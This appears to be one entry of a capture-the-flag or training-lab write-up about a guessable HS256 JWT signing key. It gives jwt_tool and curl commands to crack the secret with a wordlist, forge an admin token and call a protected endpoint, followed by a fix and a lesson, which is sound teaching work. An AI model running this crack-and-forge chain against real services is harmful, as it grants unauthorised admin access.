# 8 — Weak JWT signing key

**The vuln:** tokens are HS256-signed with a low-entropy, guessable secret. A JWT's payload is
just base64 (public); only the signature stops tampering — and it's only as strong as the key.

**The exploit:** crack the key offline, then forge an admin token.
```bash
jwt_tool <your-token> -C -d challenges/jwt-wordlist.txt        # crack the HS256 secret
jwt_tool <token> -S hs256 -p "<cracked-key>" -pc role -pv admin  # forge role=admin (keep iss/aud)
curl http://<host>:5008/api/admin/data -H "Authorization: Bearer <forged>"   # flag
```

**The fix:** use a real signing key — 256 bits of randomness from config, never hardcoded or
guessable; better, move to asymmetric RS256 so the API holds only the public key. Rotate the
old key.

**The lesson:** a token you can *read* isn't one you can *trust*. The whole scheme rests on
the signing key's secrecy and entropy. (.NET note: it forces HS256 keys ≥256 bits — so the
weakness here is entropy, not length. `alg:none` doesn't work on ASP.NET's middleware.)
